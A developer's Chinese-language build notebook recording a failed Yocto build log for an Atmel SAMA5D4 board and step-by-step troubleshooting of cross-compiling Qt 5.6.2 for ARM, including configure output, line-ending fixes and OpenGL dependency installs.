meta-yocto-bsp    = "krogoth:ae9b341ecfcc60e970f29cfe04306411ad26c0cf"
meta-atmel        = "krogoth:c415e7330e6fd92e860423d144d6c98bf20c8887"
meta-oe           
meta-networking   
meta-python       
meta-ruby         
meta-multimedia   = "krogoth:55c8a76da5dc099a7bc3838495c672140cedb78e"
meta-qt5          = "krogoth:2b1871f0d139dc3caaa779a32a1931409c245a36"

NOTE: Preparing RunQueue
NOTE: Tainting hash to force rebuild of task /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-atmel/qt5-layer/recipes-qt/images/atmel-qt5-demo-image.bb, do_populate_sdk
NOTE: Executing SetScene Tasks
NOTE: Executing RunQueue Tasks
WARNING: libproxy-0.4.11-r0 do_fetch: Failed to fetch URL http://snapshot.debian.org/archive/debian/20160728T043443Z/pool/main/libp/libproxy/libproxy_0.4.11.orig.tar.gz, attempting MIRRORS if available
WARNING: ethtool-4.2-r0 do_fetch: Failed to fetch URL http://kernel.org/pub/software/network/ethtool/ethtool-4.2.tar.gz, attempting MIRRORS if available
WARNING: openssh-7.1p2-r0 do_fetch: Failed to fetch URL http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.1p2.tar.gz, attempting MIRRORS if available
WARNING: mpeg2dec-0.4.1-r2 do_fetch: Failed to fetch URL http://libmpeg2.sourceforge.net/files/mpeg2dec-0.4.1.tar.gz, attempting MIRRORS if available
WARNING: apmd-3.2.2-15-r0 do_fetch: Failed to fetch URL http://snapshot.debian.org/archive/debian/20160728T043443Z/pool/main/a/apmd/apmd_3.2.2.orig.tar.gz;name=tarball, attempting MIRRORS if available
WARNING: sysklogd-1.5.1-r0 do_fetch: Failed to fetch URL http://www.infodrom.org/projects/sysklogd/download/sysklogd-1.5.1.tar.gz, attempting MIRRORS if available
ERROR: apmd-3.2.2-15-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 4, output:
wget: unable to resolve host address 'snapshot.debian.org'

ERROR: apmd-3.2.2-15-r0 do_fetch: Function failed: Fetcher failure for URL: 'http://snapshot.debian.org/archive/debian/20160728T043443Z/pool/main/a/apmd/apmd_3.2.2.orig.tar.gz;name=tarball'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/cortexa5hf-neon-poky-linux-gnueabi/apmd/3.2.2-15-r0/temp/log.do_fetch.15423
ERROR: Task 3283 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-bsp/apmd/apmd_3.2.2-15.bb, do_fetch) failed with exit code '1'
ERROR: sysklogd-1.5.1-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 4, output:
wget: unable to resolve host address 'www.infodrom.org'

ERROR: sysklogd-1.5.1-r0 do_fetch: Function failed: Fetcher failure for URL: 'http://www.infodrom.org/projects/sysklogd/download/sysklogd-1.5.1.tar.gz'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/cortexa5hf-neon-poky-linux-gnueabi/sysklogd/1.5.1-r0/temp/log.do_fetch.15450
ERROR: Task 3270 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-extended/sysklogd/sysklogd_1.5.1.bb, do_fetch) failed with exit code '1'
WARNING: time-1.7-r2 do_fetch: Failed to fetch URL http://ftp.gnu.org/gnu/time/time-1.7.tar.gz, attempting MIRRORS if available
WARNING: wpa-supplicant-2.5-r0 do_fetch: Failed to fetch URL http://w1.fi/releases/wpa_supplicant-2.5.tar.gz, attempting MIRRORS if available
WARNING: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Failed to fetch URL git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git, attempting MIRRORS if available
ERROR: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 128, output:
Cloning into bare repository '/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/downloads/git2/github.com.qt.qtbase.git'...
fatal: read error: Connection timed out
fatal: early EOF
fatal: index-pack failed

ERROR: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Function failed: Fetcher failure for URL: 'git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/x86_64-linux/qtbase-native/5.6.2+gitAUTOINC+b4ada3f0d8-r0/temp/log.do_fetch.12778
ERROR: Task 1923 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase-native_git.bb, do_fetch) failed with exit code '1'
NOTE: Tasks Summary: Attempted 2348 tasks of which 1710 didn't need to be rerun and 3 failed.
Waiting for 0 running tasks to finish:

Summary: 3 tasks failed:
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-bsp/apmd/apmd_3.2.2-15.bb, do_fetch
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-extended/sysklogd/sysklogd_1.5.1.bb, do_fetch
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase-native_git.bb, do_fetch
Summary: There were 9 WARNING messages shown.
Summary: There were 6 ERROR messages shown, returning a non-zero exit code.
/* log : end */
	











20170120
关于 yocto project  的学习!!
You can find log files for each task in the recipe's temp directory 
	(e.g. poky/build/tmp/work/qemux86-poky-linux/foo/1.3.0-r0/temp). 
	 Log files are named log.taskname (e.g. log.do_configure, log.do_fetch, and log.do_compile). 
To add a new machine, you need to add a new machine configuration file to the layer's conf/machine directory. 
	This configuration file provides details about the device you are adding. 	
	The most important variables you must set in your machine configuration file 	
	or include from a lower-level configuration file are as follows:
		TARGET_ARCH (e.g. "arm")
		PREFERRED_PROVIDER_virtual/kernel
		MACHINE_FEATURES (e.g. "apm screen wifi")
	You might also need these variables:
		SERIAL_CONSOLES (e.g. "115200;ttyS0 115200;ttyS1")
		KERNEL_IMAGETYPE (e.g. "zImage")
		IMAGE_FSTYPES (e.g. "tar.gz jffs2")
	You can find full details on these variables in the reference section. 
	You can leverage existing machine .conf files from meta-yocto-bsp/conf/machine/. 
Adding a Kernel for the Machine








20170203
/** 配置qt5.6.2 环境 **/
下载源码:
	http://download.qt.io/official_releases/qt/5.6/5.6.2/single/下载(官方发布非调试版本):
		qt-everywhere-opensource-src-5.6.2.zip
	然后解压
配置 qmake:
	qtbase/mkspecs/linux-arm-gnueabi-g++/qmake.conf
	#
	# qmake configuration for building with arm-linux-gnueabi-g++
	#

	MAKEFILE_GENERATOR      = UNIX
	CONFIG                 += incremental
	QMAKE_INCREMENTAL_STYLE = sublib
	
	QT_QPA_DEFAULT_PLATFORM = linuxfb   
	#QMAKE_CFLAGS_RELEASE   +=-O2 -march=armv5te  
	QMAKE_CFLAGS_RELEASE	+= -O2 -march=armv7-a      	#选择armv7架构
	QMAKE_CXXFLAGS_RELEASE	+= -O2 -march=armv7-a  		#选择armv7架构
	
	include(../common/linux.conf)
	include(../common/gcc-base-unix.conf)
	include(../common/g++-unix.conf)
	
	# modifications to g++.conf
	QMAKE_CC                = arm-linux-gnueabihf-gcc	#把 arm-linux-gnueabi  换成arm-linux-gnueabihf
	QMAKE_CXX               = arm-linux-gnueabihf-g++
	QMAKE_LINK              = arm-linux-gnueabihf-g++
	QMAKE_LINK_SHLIB        = arm-linux-gnueabihf-g++
	
	# modifications to linux.conf
	QMAKE_AR                = arm-linux-gnueabihf-ar cqs
	QMAKE_OBJCOPY           = arm-linux-gnueabihf-objcopy
	QMAKE_NM                = arm-linux-gnueabihf-nm -P
	QMAKE_STRIP             = arm-linux-gnueabihf-strip
	load(qt_config)

配置 QT 工具链:
	cd 到 qt-everywhere-opensource-src-5.6.2 源码根目录
	..sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2$ ./configure -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -no-c++11 -qreal float
		//-xplatform linux-arm-gnueabi-g++ 说明 生成的QT工具包和库是面向arm架构的，表示这些工具和库要用对应的编译工具生成
		//-prefix home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a 表示 生成的QT工具包和库 都install到的目标文件夹
		//-no-c++11 表示不使用C++11标准来编译文件, 即使用旧版的 c++98 标准来编译工具链
	./configure出错:  bash: ./configure: /bin/sh^M: 解释器错误: 没有那个文件或目录
		由于configure文件本来面向win系统 以 \n\r表示行结尾, 而linux单纯以 \n表示行结尾,
		在linux里 \r 被显示为^M
		所以要把\r替换为空格
		注意使用gedit 去掉\r 不彻底,由于gedit自动识别到 configure是 win文件 所以 保存文件时又会重新添上 \r
		不然./configure还会出现像:/bin/sh: 0: Can't open  这样的错误!!
		所以使用命令替换\r为空格 : sed -i 's/\r$//' configure
		./configure 继续出错: ./configure: 49: exec: /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/configure: not found
		原因是: qtbase/configure 依然有 /r
			sed -i 's/\r$//' ./qtbase/configure
		./configure 继续出错: You don't seem to have 'make' or 'gmake' in your PATH.
			初步解决办法: sudo apt-get install build-essential(未执行)

发现: qt-everywhere-opensource-src-5.6.2.zip 是面向 win 的源码包,
	我们应该下载面向linux 的源码包 :qt-everywhere-opensource-src-5.6.2.tar.gz
	重新配置....
	然后 ./cofigure 一直通过,没有再出现之前遇到的错误
/* log : start */
+ cd qtbase
+ /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/configure -top-level -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -no-c++11 -qreal float

This is the Qt Open Source Edition.

You are licensed to use this software under the terms of
the Lesser GNU General Public License (LGPL) versions 2.1.
You are also licensed to use this software under the terms of
the GNU Lesser General Public License (LGPL) versions 3.

Type '3' to view the GNU Lesser General Public License version 3.
Type 'L' to view the Lesser GNU General Public License version 2.1.
Type 'yes' to accept this license offer.
Type 'no' to decline this license offer.

Do you accept the terms of either license? yes

Running configuration tests (phase 1)...
Done running configuration tests.
Creating qmake...
.........................................................................................Done.
Running configuration tests (phase 2)...
Warning: Disabling pkg-config since PKG_CONFIG_LIBDIR is not set and
the host's .pc files would be used (even if you set PKG_CONFIG_PATH).
Set this variable to the directory that contains target .pc files
for pkg-config to function correctly when cross-compiling or
use -pkg-config to override this test.
Warning: Disabling pkg-config since PKG_CONFIG_SYSROOT_DIR is not set.
Set this variable to your sysroot for pkg-config to function correctly when
cross-compiling or use -pkg-config to override this test.
checking for default C++ standard edition...  yes.
checking for 64-bit std::atomic...  yes.
checking for sse2...  no.
checking for ipc_sysv...  yes.
checking for zlib...  no.
checking for mtdev...  no.
checking for libjpeg...  no.
checking for libpng...  no.
checking for dlopen...  no.
checking for libdl...  yes.
checking for DB2...  no.
checking for InterBase...  no.
checking for MySQL (thread-safe)...  no.
checking for MySQL (thread-unsafe)...  no.
checking for OCI...  no.
checking for ODBC...  no.
checking for iODBC...  no.
checking for PostgreSQL...  no.
checking for SQLite2...  no.
checking for TDS...  no.
checking for Cups...  no.
checking for POSIX iconv...  yes.
checking for D-Bus...  no.
checking for libproxy...  no.
checking for Glib...  no.
checking for ICU...  no.
checking for PulseAudio...  no.
checking for OpenGL...  no.
checking for OpenGL ES 2.0...  no.
checking for FontConfig...  no.
checking for libudev...  no.
checking for evdev...  yes.
checking for tslib...  no.
checking for xkbcommon...  no.
checking for XLib...  no.
checking for Xrender...  no.
checking for XInput2...  no.
checking for xcb...  no.
checking for GBM...  no.
checking for LinuxFB...  yes.
checking for KMS...  no.
checking for Mir client...  no.
checking for EGL...  no.
checking for FreeType...  no.
checking for STL...  yes.
checking for POSIX clock_gettime()...  yes.
checking for POSIX Monotonic Clock...  yes.
checking for posix_fallocate...  yes.
checking for mremap...  yes.
checking for getaddrinfo...  yes.
checking for inotify...  yes.
checking for eventfd...  yes.
checking for IPv6 interface name...  yes.
checking for getifaddrs...  yes.
checking for cloexec...  yes.
checking for OpenSSL...  no.
checking for PCRE...  no.
checking for OpenVG...  no.
checking for OpenVG...  no.
checking for OpenVG (lc includes)...  no.
checking for OpenVG (lc includes)...  no.
checking for alsa...  no.
checking for GStreamer 1.0...  no.
checking for GStreamer 0.10...  no.
Done running configuration tests.

   Configure summary

Building on:   linux-g++ (x86_64, CPU features: mmx sse sse2)
Building for:  linux-arm-gnueabi-g++ (arm, CPU features: none detected)
Platform notes:

            - Also available for Linux: linux-clang linux-kcc linux-icc linux-cxx
        
Build options:
  Configuration .......... accessibility audio-backend clock-gettime clock-monotonic compile_examples concurrent cross_compile dbus enable_new_dtags evdev eventfd freetype full-config getaddrinfo getifaddrs harfbuzz iconv inotify ipv6ifname large-config largefile linuxfb medium-config minimal-config mremap no-pkg-config pcre png posix_fallocate precompile_header qpa qpa reduce_exports release rpath shared small-config threadsafe-cloexec zlib 
  Build parts ............ libs examples
  Mode ................... release
  Using sanitizer(s)...... none
  Using C++ standard ..... c++98		//使用旧版的 c++98 标准来编译工具链
  Using gold linker....... no
  Using new DTAGS ........ yes
  Using PCH .............. yes
  Using LTCG ............. no
  Target compiler supports:
    Neon ................. no

Qt modules and options:
  Qt D-Bus ............... yes (loading dbus-1 at runtime)
  Qt Concurrent .......... yes
  Qt GUI ................. yes
  Qt Widgets ............. yes
  Large File ............. yes
  QML debugging .......... yes
  Use system proxies ..... no

Support enabled for:
  Accessibility .......... yes
  ALSA ................... no
  CUPS ................... no
  Evdev .................. yes
  FontConfig ............. no
  FreeType ............... yes (bundled copy)
  Glib ................... no
  GStreamer .............. no
  GTK theme .............. no
  HarfBuzz ............... yes (bundled copy)
  Iconv .................. yes
  ICU .................... no
  Image formats: 
    GIF .................. yes (plugin, using bundled copy)
    JPEG ................. yes (plugin, using bundled copy)
    PNG .................. yes (in QtGui, using bundled copy)
  libinput................ no
  Logging backends: 
    journald ............... no
    syslog   ............... no
  mtdev .................. no
  Networking: 
    getaddrinfo .......... yes
    getifaddrs ........... yes
    IPv6 ifname .......... yes
    libproxy.............. no
    OpenSSL .............. no
  OpenGL / OpenVG: 
    EGL .................. no
    OpenGL ............... no
    OpenVG ............... no
  PCRE ................... yes (bundled copy)
  pkg-config ............. no 
  PulseAudio ............. no
  QPA backends: 
    DirectFB ............. no
    EGLFS ................ no
      EGLFS i.MX6 ........ no
      EGLFS i.MX6 Wayland. no
      EGLFS EGLDevice .... no
      EGLFS GBM .......... no
      EGLFS Mali ......... no
      EGLFS Raspberry Pi . no
      EGLFS X11 .......... no
    LinuxFB .............. yes
    Mir client............ no
    XCB .................. no
  Session management ..... yes
  SQL drivers: 
    DB2 .................. no
    InterBase ............ no
    MySQL ................ no
    OCI .................. no
    ODBC ................. no
    PostgreSQL ........... no
    SQLite 2 ............. no
    SQLite ............... yes (plugin, using bundled copy)
    TDS .................. no
  tslib .................. no
  udev ................... no
  xkbcommon-x11........... no
  xkbcommon-evdev......... no
  zlib ................... yes (bundled copy)

Info: creating super cache file /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/.qmake.super

        NOTICE: The -no-c++11 / --c++-level=c++98 option is deprecated.

        Qt 5.7 will require C++11 support. The options are in effect for this
        Qt 5.6 build, but you should update your build scripts to remove the
        option and, if necessary, upgrade your compiler.

Qt is now configured for building. Just run 'make'.
Once everything is built, you must run 'make install'.
Qt will be installed into /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a

Prior to reconfiguration, make sure you remove any leftovers from
the previous build.
/* log : end */
	./configure成功
编译:
	make
	出错:
	在编译plugins/canbus时:
	../../../../include/QtSerialBus/../../src/serialbus/qcanbusdevice.h:98:46: error: ‘nullptr’ was not declared in this scope
In file included from main.cpp:37:0:
	../../../../include/QtSerialBus/../../src/serialbus/qcanbus.h:60:31: error: ‘nullptr’ was not declared in this scope
	main.cpp:58:14: error: ‘device’ does not name a type
	main.cpp:59:16: error: ‘device’ was not declared in this scope
	初步认为是,编译时没有开启支持 C++11 的特性!! 而一些内容需要C++11的特性来编译
重新配置:
	./configure -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -c++11 -qreal float	//注意 -c++11 前面没有-no前缀 ,这里配置应该就表示使用C++11标准编译 qt工具链 
/* log : start */
+ cd qtbase
+ /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/configure -top-level -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -c++11 -qreal float

This is the Qt Open Source Edition.

You are licensed to use this software under the terms of
the Lesser GNU General Public License (LGPL) versions 2.1.
You are also licensed to use this software under the terms of
the GNU Lesser General Public License (LGPL) versions 3.

Type '3' to view the GNU Lesser General Public License version 3.
Type 'L' to view the Lesser GNU General Public License version 2.1.
Type 'yes' to accept this license offer.
Type 'no' to decline this license offer.

Do you accept the terms of either license? yes

Running configuration tests (phase 1)...
Done running configuration tests.
Creating qmake...
.Done.
Running configuration tests (phase 2)...
Warning: Disabling pkg-config since PKG_CONFIG_LIBDIR is not set and
the host's .pc files would be used (even if you set PKG_CONFIG_PATH).
Set this variable to the directory that contains target .pc files
for pkg-config to function correctly when cross-compiling or
use -pkg-config to override this test.
Warning: Disabling pkg-config since PKG_CONFIG_SYSROOT_DIR is not set.
Set this variable to your sysroot for pkg-config to function correctly when
cross-compiling or use -pkg-config to override this test.
checking for C++11...  yes.
checking for default C++ standard edition...  yes.
checking for 64-bit std::atomic...  yes.
checking for sse2...  no.
checking for ipc_sysv...  yes.
checking for zlib...  no.
checking for mtdev...  no.
checking for libjpeg...  no.
checking for libpng...  no.
checking for dlopen...  no.
checking for libdl...  yes.
checking for DB2...  no.
checking for InterBase...  no.
checking for MySQL (thread-safe)...  no.
checking for MySQL (thread-unsafe)...  no.
checking for OCI...  no.
checking for ODBC...  no.
checking for iODBC...  no.
checking for PostgreSQL...  no.
checking for SQLite2...  no.
checking for TDS...  no.
checking for Cups...  no.
checking for POSIX iconv...  yes.
checking for D-Bus...  no.
checking for libproxy...  no.
checking for Glib...  no.
checking for ICU...  no.
checking for PulseAudio...  no.
checking for OpenGL...  no.
checking for OpenGL ES 2.0...  no.
checking for FontConfig...  no.
checking for libudev...  no.
checking for evdev...  yes.
checking for tslib...  no.
checking for xkbcommon...  no.
checking for XLib...  no.
checking for Xrender...  no.
checking for XInput2...  no.
checking for xcb...  no.
checking for GBM...  no.
checking for LinuxFB...  yes.
checking for KMS...  no.
checking for Mir client...  no.
checking for EGL...  no.
checking for FreeType...  no.
checking for STL...  yes.
checking for POSIX clock_gettime()...  yes.
checking for POSIX Monotonic Clock...  yes.
checking for posix_fallocate...  yes.
checking for mremap...  yes.
checking for getaddrinfo...  yes.
checking for inotify...  yes.
checking for eventfd...  yes.
checking for IPv6 interface name...  yes.
checking for getifaddrs...  yes.
checking for cloexec...  yes.
checking for OpenSSL...  no.
checking for PCRE...  no.
checking for OpenVG...  no.
checking for OpenVG...  no.
checking for OpenVG (lc includes)...  no.
checking for OpenVG (lc includes)...  no.
checking for alsa...  no.
checking for GStreamer 1.0...  no.
checking for GStreamer 0.10...  no.
Done running configuration tests.

   Configure summary

Building on:   linux-g++ (x86_64, CPU features: mmx sse sse2)
Building for:  linux-arm-gnueabi-g++ (arm, CPU features: none detected)
Platform notes:

            - Also available for Linux: linux-clang linux-kcc linux-icc linux-cxx
        
Build options:
  Configuration .......... accessibility audio-backend c++11 clock-gettime clock-monotonic compile_examples concurrent cross_compile dbus enable_new_dtags evdev eventfd freetype full-config getaddrinfo getifaddrs harfbuzz iconv inotify ipv6ifname large-config largefile linuxfb medium-config minimal-config mremap no-pkg-config pcre png posix_fallocate precompile_header qpa qpa reduce_exports release rpath shared small-config threadsafe-cloexec zlib 
  Build parts ............ libs examples
  Mode ................... release
  Using sanitizer(s)...... none
  Using C++ standard ..... c++11		//使用C++11标准来 编译
  Using gold linker....... no
  Using new DTAGS ........ yes
  Using PCH .............. yes
  Using LTCG ............. no
  Target compiler supports:
    Neon ................. no

Qt modules and options:
  Qt D-Bus ............... yes (loading dbus-1 at runtime)
  Qt Concurrent .......... yes
  Qt GUI ................. yes
  Qt Widgets ............. yes
  Large File ............. yes
  QML debugging .......... yes
  Use system proxies ..... no

Support enabled for:
  Accessibility .......... yes
  ALSA ................... no
  CUPS ................... no
  Evdev .................. yes
  FontConfig ............. no
  FreeType ............... yes (bundled copy)
  Glib ................... no
  GStreamer .............. no
  GTK theme .............. no
  HarfBuzz ............... yes (bundled copy)
  Iconv .................. yes
  ICU .................... no
  Image formats: 
    GIF .................. yes (plugin, using bundled copy)
    JPEG ................. yes (plugin, using bundled copy)
    PNG .................. yes (in QtGui, using bundled copy)
  libinput................ no
  Logging backends: 
    journald ............... no
    syslog   ............... no
  mtdev .................. no
  Networking: 
    getaddrinfo .......... yes
    getifaddrs ........... yes
    IPv6 ifname .......... yes
    libproxy.............. no
    OpenSSL .............. no
  OpenGL / OpenVG: 
    EGL .................. no
    OpenGL ............... no
    OpenVG ............... no
  PCRE ................... yes (bundled copy)
  pkg-config ............. no 
  PulseAudio ............. no
  QPA backends: 
    DirectFB ............. no
    EGLFS ................ no
      EGLFS i.MX6 ........ no
      EGLFS i.MX6 Wayland. no
      EGLFS EGLDevice .... no
      EGLFS GBM .......... no
      EGLFS Mali ......... no
      EGLFS Raspberry Pi . no
      EGLFS X11 .......... no
    LinuxFB .............. yes
    Mir client............ no
    XCB .................. no
  Session management ..... yes
  SQL drivers: 
    DB2 .................. no
    InterBase ............ no
    MySQL ................ no
    OCI .................. no
    ODBC ................. no
    PostgreSQL ........... no
    SQLite 2 ............. no
    SQLite ............... yes (plugin, using bundled copy)
    TDS .................. no
  tslib .................. no
  udev ................... no
  xkbcommon-x11........... no
  xkbcommon-evdev......... no
  zlib ................... yes (bundled copy)


Qt is now configured for building. Just run 'make'.
Once everything is built, you must run 'make install'.
Qt will be installed into /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a

Prior to reconfiguration, make sure you remove any leftovers from
the previous build.
/* log : end */
	然后直接make
	之前用 c++98 编译的,不用再编译,之后未编译的用 c++11 标准继续编译!!
	出错!!
/* log : start */
make[2]:正在离开目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/src'
cd examples/ && ( test -e Makefile || /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/bin/qmake /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples/examples.pro -o Makefile ) && make -f Makefile 
make[2]: 正在进入目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples'
cd canvas3d/ && ( test -e Makefile || /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/bin/qmake /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples/canvas3d/canvas3d.pro -o Makefile ) && make -f Makefile 
make[3]: 正在进入目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples/canvas3d'
cd textureandlight/ && ( test -e Makefile || /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/bin/qmake /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples/canvas3d/textureandlight/textureandlight.pro -o Makefile ) && make -f Makefile 
Project ERROR: Unknown module(s) in QT: quick
make[3]: *** [sub-textureandlight-make_first] 错误 3
make[3]:正在离开目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples/canvas3d'
make[2]: *** [sub-canvas3d-make_first] 错误 2
make[2]:正在离开目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d/examples'
make[1]: *** [sub-examples-make_first] 错误 2
make[1]:正在离开目录 `/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtcanvas3d'
make: *** [module-qtcanvas3d-make_first] 错误 2
/* log : end */
	由于是未知错误,所以,无法追踪出错源头,初步怀疑是之前用C++98 编译的模块 与后面用 C++11 编译的模块 要组合时出错!!!
	make distclean	//把之前所有生成的东西都删掉!!!! 但make distclean 也有出错的!!!	加上 -j8 加快clean速度 
	make confclean	//恢复出厂配置 configure 和 qmake.conf
	
	编译 qtcanvas3d 失败 是因为 使用的 quick 模块 需要 opengl
	网上参考:
		在编译之前，还有个改动，额。。。qt3d和qtcanvas3d在编译的时候会报错，说是未识别模块，
		而且嵌入式的没有opengl，识别了也会报错，导致编译失败，而且编译配置参数里面也没有这两个模块的配置。
		我的解决方法简单粗暴，在配置时参数加-no-opengl，然后打开qt-everywhere-opensource-src-5.7.0/qt.pro文件，找到：
			addModule(qt3d, qtdeclarative qtimageformats)
			addModule(qtcanvas3d, qtdeclarative)
		这两行注释掉（#号注释），或者直接删掉。如果不注释掉，即使加了-no-opengl也会报错，编译失败。
	这就是说跳过 qtcanvas3d qt3d 的意思,如果我坚决要编译的话,就得加入 opengl
	重新./configure:
		./configure -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -c++11 -opengl -qreal float	//添加了opengl项
		出错:
			checking for OpenGL...  no.
			checking for OpenGL ES 2.0...  no.
			All the OpenGL functionality tests failed!
			You might need to modify the include and library search paths by editing
 			QMAKE_INCDIR_OPENGL, QMAKE_LIBDIR_OPENGL and QMAKE_LIBS_OPENGL in
 			/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/qt-everywhere-opensource-src-5.6.2/qtbase/mkspecs/linux-arm-gnueabi-g++.
	网上参考:
		编译安装Qt可能出现的问题及解决办法:
		以下模块，yes的是qt默认安装的。
		Debug ............... no
		Qt 3 compatibility .. yes
		QtDBus module ....... no
		QtScriptTools module  yes
		QtXmlPatterns module  yes
		Phonon module ....... no
		SVG module .......... yes
		WebKit module ....... yes
		STL support ......... yes
		PCH support ......... yes
		MMX/3DNOW/SSE/SSE2..  yes/yes/yes/yes
		Graphics System ..... default
		IPv6 support ........ yes
		IPv6 ifname support . yes
		getaddrinfo support . yes
		getifaddrs support .. yes
		Accessibility ....... yes
		NIS support ......... yes
		CUPS support ........ no
		Iconv support ....... yes
		Glib support ........ yes
		GStreamer support ... no
		Large File support .. yes
		GIF support ......... plugin
		TIFF support ........ plugin (qt)
		JPEG support ........ plugin (system)
		PNG support ......... yes (system)
		MNG support ......... plugin (system)
		zlib support ........ system
		Session management .. yes
		OpenGL support ...... yes (Desktop OpenGL)
		NAS sound support ... no
		XShape support ...... yes
		XSync support ....... yes
		Xinerama support .... runtime
		Xcursor support ..... runtime
		Xfixes support ...... runtime
		Xrandr support ...... runtime
		Xrender support ..... yes
		Xi support .......... runtime
		MIT-SHM support ..... yes
		FontConfig support .. yes
		XKB Support ......... yes
		immodule support .... yes
		GTK theme support ... no
		PostgreSQL support .. plugin
		SQLite 2 support .... plugin
		SQLite support ...... plugin (qt)
		OpenSSL support ..... yes (run-time)
		所以，但我们开始装qt之前没有编译显示no的那些模块，我们可以
		重新编译一次。
		#./configure -phonon
		但这时候，可能会提示以下内容，
		Phonon support cannot be enabled due to functionality tests 
		解决办法：
		先下载必要的包：
		sudo apt-get install libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev
		重新#./configure -phonon
		即可。。。

		如出现
		Basic XLib functionality test failed!
		则先安装libxext-dev
		sudo apt-get install libxext-dev

		mark时出现
		/usr/bin/ld: cannot find -lXext
		则需安装libxt-dev
		sudo apt-get install libxt-dev

		mark时出现
		/usr/bin/ld: cannot find -lXrender
		则需安装libxrender-dev
		sudo apt-get install libxrender-dev

		出现
		X11/extensions/Xdamage.h: No such file or directory
		则安装libxdamage-dev
		sudo apt-get install libxdamage-dev

		About QtOpenGL
		If try -opengl then: All the OpenGL functionality tests failed!
		sudo apt-get install libgl1-mesa-dev libglu1-mesa-dev

		About QtDBus
		If try -dbus then:The QtDBus module cannot be enabled because libdbus-1 version 0.93 was not found
		sudo apt-get install libdbus-1-dev
		sudo apt-get install libedbus-dev

		gconf
		sudo apt-get install libgconf2-dev

		icu
		sudo apt-get install libicu-dev

	因此:先sudo apt-get install libgl1-mesa-dev libglu1-mesa-dev
